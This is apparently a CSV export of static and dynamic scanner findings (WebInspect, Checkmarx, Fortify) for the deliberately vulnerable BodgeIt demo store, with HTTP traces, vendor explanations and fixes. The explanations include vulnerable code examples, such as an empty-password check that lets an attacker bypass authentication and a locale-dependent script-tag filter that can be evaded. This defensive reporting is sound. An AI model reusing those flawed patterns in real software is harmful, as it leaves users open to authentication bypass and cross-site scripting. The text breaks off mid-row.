"DemoApps","","Bodgeit","24","Often Misused: Login","","High","Open","2015-10-15","WebInspect","287","Improper Authentication","A7","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""30A98F48B1D0C105232C2CC31D3672BE""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""53""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""7bfa5335-9e06-4438-909b-6eb5cbcd0dac""; X-Request-Memo: ID=""ac27e5ec-56b7-4d2a-acc5-a295c2c802fc""; sc=""1""; ThreadId=""55""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2470 Date: Thu, 15 Oct 2015 19:10:02 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","40","Insecure Transport","","High","Open","2015-10-15","WebInspect","287","Improper Authentication","A7","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/login.jsp Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""A9B5975EFB1E426DD96C6BFB28F781A6""; PSID=""30A98F48B1D0C105232C2CC31D3672BE""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""120""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""132565ba-8aa3-4949-8db0-0f3ccb259e59""; X-Request-Memo: ID=""8c4ff9c6-ad56-4121-b532-479941221f55""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2493 Date: Thu, 15 Oct 2015 19:10:52 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","273","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","368","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","483","Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","625","CGI_Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","406","CGI_Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","369","CGI_Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","417","Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","449","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","551","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","325","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","username","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","508","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","username","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","522","Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/login.jsp","username","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","423","CGI_Stored_XSS","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","267","CGI_Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","603","Reflected_XSS_All_Clients","","High","Open","2015-10-15","Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","115","Unreleased Resource: Database","","High","Open","2015-10-15","Fortify SCA","404","Improper Resource Shutdown or Release","","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sometimes fails to release a system resource allocated by <Replace key=""FirstTransitionFunction""/> on line <Replace key=""FirstTraceLocation.line""/>.<AltParagraph>The program can potentially fail to release a database connection.</AltParagraph></Paragraph></Content> Explanation: <Content>The program can potentially fail to release a database connection. <Paragraph> In this case, there are program paths on which the resource allocated in <Replace key=""FirstTraceLocation.file""/> at line <Replace key=""FirstTraceLocation.line""/> is not released. </Paragraph> Resource leaks have at least two common causes: - Error conditions and other exceptional circumstances. - Confusion over which part of the program is responsible for releasing the resource. Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool. <b>Example:</b> Under normal conditions, the following code executes a database query, processes the results returned by the database, and closes the allocated statement object. But if an exception occurs while executing the SQL or processing the results, the statement object will not be closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries. <pre> Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(CXN_SQL); harvestResults(rs); stmt.close(); </pre></Content>","Recommendations: <Content>1. Never rely on <code>finalize()</code> to reclaim resources. In order for an object's <code>finalize()</code> method to be invoked, the garbage collector must determine that the object is eligible for garbage collection. Because the garbage collector is not required to run unless the JVM is low on memory, there is no guarantee that an object's <code>finalize()</code> method will be invoked in an expedient fashion. When the garbage collector finally does run, it may cause a large number of resources to be reclaimed in a short period of time, which can lead to ""bursty"" performance and lower overall system throughput. This effect becomes more pronounced as the load on the system increases. Finally, if it is possible for a resource reclamation operation to hang (if it requires communicating over a network to a database, for example), then the thread that is executing the <code>finalize()</code> method will hang. 2. Release resources in a <code>finally</code> block. The code for the Example should be rewritten as follows: <pre> public void execCxnSql(Connection conn) { Statement stmt; try { stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(CXN_SQL); ... } finally { if (stmt != null) { safeClose(stmt); } } } public static void safeClose(Statement stmt) { if (stmt != null) { try { stmt.close(); } catch (SQLException e) { log(e); } } } </pre> This solution uses a helper function to log the exceptions that might occur when trying to close the statement. Presumably this helper function will be reused whenever a statement needs to be closed. Also, the <code>execCxnSql</code> method does not initialize the <code>stmt</code> object to null. Instead, it checks to ensure that <code>stmt</code> is not <code>null</code> before calling <code>safeClose()</code>. Without the <code>null</code> check, the Java compiler reports that <code>stmt</code> might not be initialized. This choice takes advantage of Java's ability to detect uninitialized variables. If <code>stmt</code> is initialized to <code>null</code> in a more complex method, cases in which <code>stmt</code> is used without being initialized will not be detected by the compiler.</Content> Tips: 1.Be aware that closing a database connection may or may not automatically free other resources associated with the connection object. If the application uses connection pooling, it is best to explicitly close the other resources after the connection is closed. If the application is not using connection pooling, the other resources are automatically closed when the database connection is closed. In such a case, this vulnerability is invalid.","","",""
"DemoApps","","Bodgeit","191","Unreleased Resource: Database","","High","Open","2015-10-15","Fortify SCA","404","Improper Resource Shutdown or Release","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sometimes fails to release a system resource allocated by <Replace key=""FirstTransitionFunction""/> on line <Replace key=""FirstTraceLocation.line""/>.<AltParagraph>The program can potentially fail to release a database connection.</AltParagraph></Paragraph></Content> Explanation: <Content>The program can potentially fail to release a database connection. <Paragraph> In this case, there are program paths on which the resource allocated in <Replace key=""FirstTraceLocation.file""/> at line <Replace key=""FirstTraceLocation.line""/> is not released. </Paragraph> Resource leaks have at least two common causes: - Error conditions and other exceptional circumstances. - Confusion over which part of the program is responsible for releasing the resource. Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool. <b>Example:</b> Under normal conditions, the following code executes a database query, processes the results returned by the database, and closes the allocated statement object. But if an exception occurs while executing the SQL or processing the results, the statement object will not be closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries. <pre> Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(CXN_SQL); harvestResults(rs); stmt.close(); </pre></Content>","Recommendations: <Content>1. Never rely on <code>finalize()</code> to reclaim resources. In order for an object's <code>finalize()</code> method to be invoked, the garbage collector must determine that the object is eligible for garbage collection. Because the garbage collector is not required to run unless the JVM is low on memory, there is no guarantee that an object's <code>finalize()</code> method will be invoked in an expedient fashion. When the garbage collector finally does run, it may cause a large number of resources to be reclaimed in a short period of time, which can lead to ""bursty"" performance and lower overall system throughput. This effect becomes more pronounced as the load on the system increases. Finally, if it is possible for a resource reclamation operation to hang (if it requires communicating over a network to a database, for example), then the thread that is executing the <code>finalize()</code> method will hang. 2. Release resources in a <code>finally</code> block. The code for the Example should be rewritten as follows: <pre> public void execCxnSql(Connection conn) { Statement stmt; try { stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(CXN_SQL); ... } finally { if (stmt != null) { safeClose(stmt); } } } public static void safeClose(Statement stmt) { if (stmt != null) { try { stmt.close(); } catch (SQLException e) { log(e); } } } </pre> This solution uses a helper function to log the exceptions that might occur when trying to close the statement. Presumably this helper function will be reused whenever a statement needs to be closed. Also, the <code>execCxnSql</code> method does not initialize the <code>stmt</code> object to null. Instead, it checks to ensure that <code>stmt</code> is not <code>null</code> before calling <code>safeClose()</code>. Without the <code>null</code> check, the Java compiler reports that <code>stmt</code> might not be initialized. This choice takes advantage of Java's ability to detect uninitialized variables. If <code>stmt</code> is initialized to <code>null</code> in a more complex method, cases in which <code>stmt</code> is used without being initialized will not be detected by the compiler.</Content> Tips: 1.Be aware that closing a database connection may or may not automatically free other resources associated with the connection object. If the application uses connection pooling, it is best to explicitly close the other resources after the connection is closed. If the application is not using connection pooling, the other resources are automatically closed when the database connection is closed. In such a case, this vulnerability is invalid.","","",""
"DemoApps","","Bodgeit","165","Privacy Violation: Autocomplete","","High","Open","2015-10-15","Fortify SCA","522","Insufficiently Protected Credentials","A2","root/login.jsp","","","http://localhost/root/login.jsp","","","","Abstract: <Content><Paragraph>The form in <Replace key=""PrimaryLocation.file""/> uses autocompletion on line <Replace key=""PrimaryLocation.line""/>, which allows some browsers to retain sensitive information in their history.<AltParagraph>Autocompletion of forms allows some browsers to retain sensitive information in their history.</AltParagraph></Paragraph></Content> Explanation: <Content>With autocompletion enabled, some browsers retain user input across sessions, which could allow someone using the computer after the initial user to see information previously submitted.</Content>","Recommendations: <Content>Explicitly disable autocompletion on forms or sensitive inputs. By disabling autocompletion, information previously entered will not be presented back to the user as they type. It will also disable the ""remember my password"" functionality of most major browsers. <b>Example 1:</b> In an HTML form, disable autocompletion for all input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the <code>form</code> tag. <pre> &lt;form method=""post"" autocomplete=""off""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" /&gt; &lt;/form&gt; </pre> <b>Example 2:</b> Alternatively, disable autocompletion for specific input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the corresponding tags. <pre> &lt;form method=""post""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" autocomplete=""off""/&gt; &lt;/form&gt; </pre> Note that the default value of the <code>autocomplete</code> attributed is <code>on</code>. Therefore do not omit the attribute when dealing with sensitive inputs.</Content>","","",""
"DemoApps","","Bodgeit","149","Privacy Violation: Autocomplete","","High","Open","2015-10-15","Fortify SCA","522","Insufficiently Protected Credentials","A2","root/password.jsp","","","http://localhost/root/password.jsp","","","","Abstract: <Content><Paragraph>The form in <Replace key=""PrimaryLocation.file""/> uses autocompletion on line <Replace key=""PrimaryLocation.line""/>, which allows some browsers to retain sensitive information in their history.<AltParagraph>Autocompletion of forms allows some browsers to retain sensitive information in their history.</AltParagraph></Paragraph></Content> Explanation: <Content>With autocompletion enabled, some browsers retain user input across sessions, which could allow someone using the computer after the initial user to see information previously submitted.</Content>","Recommendations: <Content>Explicitly disable autocompletion on forms or sensitive inputs. By disabling autocompletion, information previously entered will not be presented back to the user as they type. It will also disable the ""remember my password"" functionality of most major browsers. <b>Example 1:</b> In an HTML form, disable autocompletion for all input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the <code>form</code> tag. <pre> &lt;form method=""post"" autocomplete=""off""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" /&gt; &lt;/form&gt; </pre> <b>Example 2:</b> Alternatively, disable autocompletion for specific input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the corresponding tags. <pre> &lt;form method=""post""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" autocomplete=""off""/&gt; &lt;/form&gt; </pre> Note that the default value of the <code>autocomplete</code> attributed is <code>on</code>. Therefore do not omit the attribute when dealing with sensitive inputs.</Content>","","",""
"DemoApps","","Bodgeit","151","Privacy Violation: Autocomplete","","High","Open","2015-10-15","Fortify SCA","522","Insufficiently Protected Credentials","A2","root/password.jsp","","","http://localhost/root/password.jsp","","","","Abstract: <Content><Paragraph>The form in <Replace key=""PrimaryLocation.file""/> uses autocompletion on line <Replace key=""PrimaryLocation.line""/>, which allows some browsers to retain sensitive information in their history.<AltParagraph>Autocompletion of forms allows some browsers to retain sensitive information in their history.</AltParagraph></Paragraph></Content> Explanation: <Content>With autocompletion enabled, some browsers retain user input across sessions, which could allow someone using the computer after the initial user to see information previously submitted.</Content>","Recommendations: <Content>Explicitly disable autocompletion on forms or sensitive inputs. By disabling autocompletion, information previously entered will not be presented back to the user as they type. It will also disable the ""remember my password"" functionality of most major browsers. <b>Example 1:</b> In an HTML form, disable autocompletion for all input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the <code>form</code> tag. <pre> &lt;form method=""post"" autocomplete=""off""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" /&gt; &lt;/form&gt; </pre> <b>Example 2:</b> Alternatively, disable autocompletion for specific input fields by explicitly setting the value of the <code>autocomplete</code> attribute to <code>off</code> on the corresponding tags. <pre> &lt;form method=""post""&gt; Address: &lt;input name=""address"" /&gt; Password: &lt;input name=""password"" type=""password"" autocomplete=""off""/&gt; &lt;/form&gt; </pre> Note that the default value of the <code>autocomplete</code> attributed is <code>on</code>. Therefore do not omit the attribute when dealing with sensitive inputs.</Content>","","",""
"DemoApps","","Bodgeit","173","Portability Flaw: Locale Dependent Comparison","","High","Open","2015-10-15","Fortify SCA","474","Use of Function with Inconsistent Implementations","","src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","Abstract: <Content><Paragraph>The call to <Replace key=""PrimaryTransitionFunction.name""/> on line <Replace key=""PrimaryLocation.line""/> causes portability problems because it has different locales which may lead to unexpected output. This may also circumvent custom validation routines.<AltParagraph>Unexpected portability problems can be found when the locale is not specified.</AltParagraph></Paragraph></Content> Explanation: <Content>When comparing data that may be locale-dependent, an appropriate locale should be specified. <b>Example 1:</b> The following example tries to perform validation to determine if user input includes a <code>&lt;script&gt;</code> tag. <pre> ... public String tagProcessor(String tag){ if (tag.toUpperCase().equals(""SCRIPT"")){ return null; } //does not contain SCRIPT tag, keep processing input ... } ... </pre> The problem with the above code is that <code>java.lang.String.toUpperCase()</code> when used without a locale uses the rules of the default locale. Using the Turkish locale <code>""title"".toUpperCase()</code> returns &quot;T\u0130TLE&quot;, where &quot;\u0130&quot; is the &quot;LATIN CAPITAL LETTER I WITH DOT ABOVE&quot; character. This can lead to unexpected results, such as in Example 1 where this will prevent the word &quot;script&quot; from being caught by this validation, potentially leading to a Cross-Site Scripting vulnerability.</Content>","Recommendations: <Content>To prevent this from occurring, always make sure to either specify the default locale, or specify the locale with APIs that accept them such as <code>toUpperCase()</code>. <b>Example 2:</b> The following specifies the locale manually as an argument to <code>toUpperCase()</code>. <pre> import java.util.Locale; ... public String tagProcessor(String tag){ if (tag.toUpperCase(Locale.ENGLISH).equals(""SCRIPT"")){ return null; } //does not contain SCRIPT tag, keep processing input ... } ... </pre> <b>Example 3:</b> The following uses the function <code>java.lang.String.equalsIgnoreCase()</code> API to prevent this issue. <pre> ... public String tagProcessor(String tag){ if (tag.equalsIgnoreCase(""SCRIPT"")){ return null; } //does not contain SCRIPT tag, keep processing input ... } ... </pre> This prevents the problem because <code>equalsIgnoreCase()</code> changes case similar to <code>Character.toLowerCase()</code> and <code>Character.toUpperCase()</code>. This involves creating temporary canonical forms of both strings using information from the <code>UnicodeData</code> file that is part of the Unicode Character Database maintained by the Unicode Consortium, and even though this may render them unreadable if they were to be read out, it makes comparison possible without being dependent upon locale.</Content> Tips: 1.If SCA sees that <code>java.util.Locale.setDefault()</code> is called anywhere in the application, it will assume that the locale has been set accordingly and these issues will also not appear.","","",""
"DemoApps","","Bodgeit","117","Password Management: Empty Password","","High","Open","2015-10-15","Fortify SCA","259","Use of Hard-coded Password","","root/dbconnection.jspf","","","http://localhost/root/dbconnection.jspf","","","","Abstract: <Content>Empty passwords may compromise system security in a way that cannot be easily remedied.</Content> Explanation: <Content>It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths. <Paragraph> In this case an empty password was found in the call to <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The code below attempts to connect to a database with an empty password. <pre> ... DriverManager.getConnection(url, ""scott"", """"); ... </pre> If the code in Example 1 succeeds, it indicates that the database user account ""scott"" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change. <b>Example 2:</b> The code below initializes a password variable to an empty string, attempts to read a stored value for the password, and compares it against a user-supplied value. <pre> ... String storedPassword = """"; String temp; if ((temp = readPassword()) != null) { storedPassword = temp; } if(storedPassword.equals(userPassword)) // Access protected resources ... } ... </pre> If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for <code>userPassword</code>. In the mobile world, password management is even trickier, considering a much higher chance of device loss. <b>Example 3:</b> The code below initializes username and password variables to empty strings, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages. <pre> ... webview.setWebViewClient(new WebViewClient() { public void onReceivedHttpAuthRequest(WebView view, HttpAuthHandler handler, String host, String realm) { String username = """"; String password = """"; if (handler.useHttpAuthUsernamePassword()) { String[] credentials = view.getHttpAuthUsernamePassword(host, realm); username = credentials[0]; password = credentials[1]; } handler.proceed(username, password); } }); ... </pre> Similar to Example 2, if <code>useHttpAuthUsernamePassword()</code> returns <code>false</code>, an attacker will be able to view protected pages by supplying an empty password.</Content>","Recommendations: <Content>Always read stored password values from encrypted, external resources and assign password variables meaningful values. Ensure that sensitive resources are never protected with empty or null passwords. For Android, as well as any other platform that uses SQLite database, a good option is SQLCipher -- an extension to SQLite database that provides transparent 256-bit AES encryption of database files. Thus, credentials can be stored in an encrypted database. <b>Example 4:</b> The code below demonstrates how to integrate SQLCipher into an Android application after downloading the necessary binaries, and store credentials into the database file. <pre> import net.sqlcipher.database.SQLiteDatabase; ... SQLiteDatabase.loadLibs(this); File dbFile = getDatabasePath(""credentials.db""); dbFile.mkdirs(); dbFile.delete(); SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, ""credentials"", null); db.execSQL(""create table credentials(u, p)""); db.execSQL(""insert into credentials(u, p) values(?, ?)"", new Object[]{username, password}); ... </pre> Note that references to <code>android.database.sqlite.SQLiteDatabase</code> are substituted with those of <code>net.sqlcipher.database.SQLiteDatabase</code>. To enable encryption on the WebView store, WebKit has to be re-compiled with the <code>sqlcipher.so</code> library.</Content> Tips: 1.The Fortify Java Annotations FortifyPassword and FortifyNotPassword can be used to indicate which fields and variables represent passwords. 2.When identifying null, empty, or hardcoded passwords, default rules only consider fields and variables that contain the word <code>password</code>. However, the HPE Security Fortify Custom Rules Editor provides the Password Management wizard that makes it easy to create rules for detecting password management issues on custom-named fields and variables.","","",""
"DemoApps","","Bodgeit","200","Password Management: Empty Password","","High","Open","2015-10-15","Fortify SCA,Checkmarx","259","Use of Hard-coded Password","","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content>Empty passwords may compromise system security in a way that cannot be easily remedied.</Content> Explanation: <Content>It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths. <Paragraph> In this case an empty password was found in the call to <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The code below attempts to connect to a database with an empty password. <pre> ... DriverManager.getConnection(url, ""scott"", """"); ... </pre> If the code in Example 1 succeeds, it indicates that the database user account ""scott"" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change. <b>Example 2:</b> The code below initializes a password variable to an empty 